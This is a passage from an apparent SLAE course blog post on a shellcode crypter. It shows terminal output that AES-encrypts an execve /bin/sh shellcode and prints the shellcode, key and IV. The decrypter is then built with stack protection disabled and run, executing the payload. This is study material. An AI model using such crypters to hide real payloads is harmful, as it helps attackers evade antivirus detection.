<span class="o">[</span>+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
<span class="o">[</span>+] Original Shellcode <span class="o">(</span>25 bytes<span class="o">)</span>:
<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
<span class="o">[</span>+] Encrypted Shellcode <span class="o">(</span>32 bytes<span class="o">)</span>:
<span class="se">\x</span>b0<span class="se">\x</span>69<span class="se">\x</span>09<span class="se">\x</span>de<span class="se">\x</span>c5<span class="se">\x</span>63<span class="se">\x</span>0e<span class="se">\x</span>69<span class="se">\x</span>5c<span class="se">\x</span>d1<span class="se">\x</span>7e<span class="se">\x</span>34<span class="se">\x</span>f3<span class="se">\x</span>c1<span class="se">\x</span>7b<span class="se">\x</span>28<span class="se">\x</span>6c<span class="se">\x</span>47<span class="se">\x</span>48<span class="se">\x</span>d4<span class="se">\x</span>5b<span class="se">\x</span>83<span class="se">\x</span>82<span class="se">\x</span>6b<span class="se">\x</span>4b<span class="se">\x</span>b5<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>b1<span class="se">\x</span>3e<span class="se">\x</span>f2<span class="se">\x</span>70
</code></pre></div> <p>Second, the 256 bit AES key, 128 bit initialization vector and encrypted shellcode are all placed into decrypt.c</p> <p>decrypt.c then uses the aforementioned key and IV to decrypt the encrypted shellcode and display the shellcode in it’s original form. The <code class="highlighter-rouge">execute_shellcode</code> function is then called and passes control of the program to the shellcode, this continues to use <code class="highlighter-rouge">execve</code> to execute <code class="highlighter-rouge">/bin/sh</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>gcc encrypt.c -l crypto -o encrypt
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>./encrypt
<span class="o">[</span>+] AES 128 bit IV: KSB1FebW397VI5uG
<span class="o">[</span>+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
<span class="o">[</span>+] Original Shellcode <span class="o">(</span>25 bytes<span class="o">)</span>:
<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
<span class="o">[</span>+] Encrypted Shellcode <span class="o">(</span>32 bytes<span class="o">)</span>:
<span class="se">\x</span>b0<span class="se">\x</span>69<span class="se">\x</span>09<span class="se">\x</span>de<span class="se">\x</span>c5<span class="se">\x</span>63<span class="se">\x</span>0e<span class="se">\x</span>69<span class="se">\x</span>5c<span class="se">\x</span>d1<span class="se">\x</span>7e<span class="se">\x</span>34<span class="se">\x</span>f3<span class="se">\x</span>c1<span class="se">\x</span>7b<span class="se">\x</span>28<span class="se">\x</span>6c<span class="se">\x</span>47<span class="se">\x</span>48<span class="se">\x</span>d4<span class="se">\x</span>5b<span class="se">\x</span>83<span class="se">\x</span>82<span class="se">\x</span>6b<span class="se">\x</span>4b<span class="se">\x</span>b5<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>b1<span class="se">\x</span>3e<span class="se">\x</span>f2<span class="se">\x</span>70
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>vim decrypt.c
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>cat decrypt.c | grep <span class="s2">"iv</span><span class="se">\[\]</span><span class="s2">"</span>
  unsigned char iv[] <span class="o">=</span> <span class="s2">"KSB1FebW397VI5uG"</span>;
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>cat decrypt.c | grep <span class="s2">"key</span><span class="se">\[\]</span><span class="s2">"</span>
  unsigned char key[] <span class="o">=</span> <span class="s2">"PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw"</span>;
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>cat decrypt.c | grep <span class="s2">"encrypted</span><span class="se">\[\]</span><span class="s2">"</span>
  unsigned char encrypted[] <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">70"</span>;
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>./decrypt
<span class="o">[</span>+] Encrypted Shellcode <span class="o">(</span>32 bytes<span class="o">)</span>:
<span class="se">\x</span>b0<span class="se">\x</span>69<span class="se">\x</span>09<span class="se">\x</span>de<span class="se">\x</span>c5<span class="se">\x</span>63<span class="se">\x</span>0e<span class="se">\x</span>69<span class="se">\x</span>5c<span class="se">\x</span>d1<span class="se">\x</span>7e<span class="se">\x</span>34<span class="se">\x</span>f3<span class="se">\x</span>c1<span class="se">\x</span>7b<span class="se">\x</span>28<span class="se">\x</span>6c<span class="se">\x</span>47<span class="se">\x</span>48<span class="se">\x</span>d4<span class="se">\x</span>5b<span class="se">\x</span>83<span class="se">\x</span>82<span class="se">\x</span>6b<span class="se">\x</span>4b<span class="se">\x</span>b5<span class="se">\x</span>52<span class="se">\x</span>47<span class="se">\x</span>b1<span class="se">\x</span>3e<span class="se">\x</span>f2<span class="se">\x</span>70
<span class="o">[</span>+] AES 128 bit IV: KSB1FebW397VI5uG
<span class="o">[</span>+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
<span class="o">[</span>+] Decrypted Shellcode <span class="o">(</span>25 bytes<span class="o">)</span>:
<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
<span class="o">[</span>+] Executing Shellcode:

<span class="err">$</span>
</code></pre></div> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#crypter" title="Pages tagged crypter" class="tag"><span class="term">crypter</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-7/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-7/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-7/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
